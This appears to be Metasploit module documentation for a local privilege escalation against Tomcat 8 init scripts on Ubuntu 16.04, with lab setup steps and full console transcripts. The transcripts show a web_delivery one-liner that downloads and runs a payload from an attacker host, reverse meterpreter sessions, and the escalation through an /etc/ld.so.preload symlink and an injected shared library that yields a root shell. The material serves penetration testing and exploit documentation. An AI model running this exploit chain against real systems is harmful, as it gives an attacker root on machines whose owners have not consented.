## Vulnerable Application

Tomcat (6, 7, 8) packages provided by default repositories on Debian-based
distributions (including Debian, Ubuntu etc.) provide a vulnerable
tomcat init script that allows local attackers who have already gained access
to the tomcat account (for example, by exploiting an RCE vulnerability
in a java web application hosted on Tomcat, uploading a webshell etc.) to
escalate their privileges from tomcat user to root and fully compromise the
target system.

Tested against Tomcat 8.0.32-1ubuntu1.1 on Ubuntu 16.04

### Install

This will install Tomcat 8 (8.0.32-1ubuntu1.1) on Ubuntu 16.04 using the build from
[launchpad](https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/10427282)

We also change the `tomcat8` user's shell to `/bin/bash` to make setting up the priv-esc
easier.

```
sudo apt-get install libecj-java build-essential
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/10427282/+files/tomcat8_8.0.32-1ubuntu1.1_all.deb
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/10427282/+files/libtomcat8-java_8.0.32-1ubuntu1.1_all.deb
wget https://launchpad.net/~ubuntu-security/+archive/ubuntu/ppa/+build/10427282/+files/tomcat8-common_8.0.32-1ubuntu1.1_all.deb
sudo dpkg -i *tomcat*.deb
sudo sed -i 's|/bin/false|/bin/bash|g' /etc/passwd
```

You can now `su tomcat8` and get your starter shell.

## Verification Steps

1. Install the application
2. Start msfconsole
3. Get an initial shell as the `tomcat` user (may be version dependent like `tomcat8`)
4. Do: `use exploit/linux/local/tomcat_ubuntu_log_init_priv_esc`
5. Do: `set session #`
6. Do: `run`
7. You should get a root shell.

## Options

### CATALINA

Location of `catalina.out` file. Defaults to `/var/log/tomcat8/catalina.out`.

## Scenarios

### Tomcat8 (8.0.32-1ubuntu1.1) on Ubuntu 16.04

Initial shell

```
msf6 > use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set lhost 1.1.1.1
lhost => 1.1.1.1
msf6 exploit(multi/script/web_delivery) > set target 7
target => 7
msf6 exploit(multi/script/web_delivery) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Using URL: http://1.1.1.1:8080/TymOdj7T0Wc
[*] Server started.
[*] Run the following command on the target machine:
wget -qO NaXlMbmV --no-check-certificate http://1.1.1.1:8080/TymOdj7T0Wc; chmod +x NaXlMbmV; ./NaXlMbmV& disown
[*] 2.2.2.2    web_delivery - Delivering Payload (207 bytes)
[*] Sending stage (1017704 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:59862) at 2023-01-16 07:23:48 -0500

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: tomcat8
meterpreter > sysinfo
Computer     : 2.2.2.2
OS           : Ubuntu 16.04 (Linux 4.4.0-134-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > background
[*] Backgrounding session 1...
```

Priv Esc

```
msf6 exploit(multi/script/web_delivery) > use exploit/linux/local/tomcat_ubuntu_log_init_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/tomcat_ubuntu_log_init_priv_esc) > set verbose true
verbose => true
msf6 exploit(linux/local/tomcat_ubuntu_log_init_priv_esc) > set session 1
session => 1
msf6 exploit(linux/local/tomcat_ubuntu_log_init_priv_esc) > run

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Vulnerable app version detected: 8.0.32.pre.1ubuntu1.1
[*] Creating backup of /var/log/tomcat8/catalina.out
[+] Original /var/log/tomcat8/catalina.out backed up to /root/.msf4/loot/20230116072430_default_2.2.2.2_varlogtomcat8_824428.txt
[*] Uploading Payload to /tmp/.SG5N9O
[*] Writing '/tmp/.SG5N9O' (250 bytes) ...
[*] Compiling exploit stub: /tmp/.INpf7Gw.so
[*] Deleting /var/log/tomcat8/catalina.out
[*] Creating symlink from /etc/ld.so.preload to /var/log/tomcat8/catalina.out
[+] Waiting 1800 seconds on tomcat to re-open the logs aka a Tomcat service restart
[*] Sleeping for 2 seconds before attempting again
[*] Sleeping for 4 seconds before attempting again
[*] Sleeping for 8 seconds before attempting again
[*] Sleeping for 16 seconds before attempting again
[*] injecting /tmp/.INpf7Gw.so into /etc/ld.so.preload
[*] Escalating payload privileges via SUID binary (sudo)
[*] Executing payload
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 2.2.2.2
[+] Deleted /tmp/.SG5N9O
[+] Deleted /tmp/.INpf7Gw.so
[!] Tried to delete /var/log/tomcat8/catalina.out, unknown result
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:59866) at 2023-01-16 07:24:55 -0500

meterpreter > getuid
Server username: root
```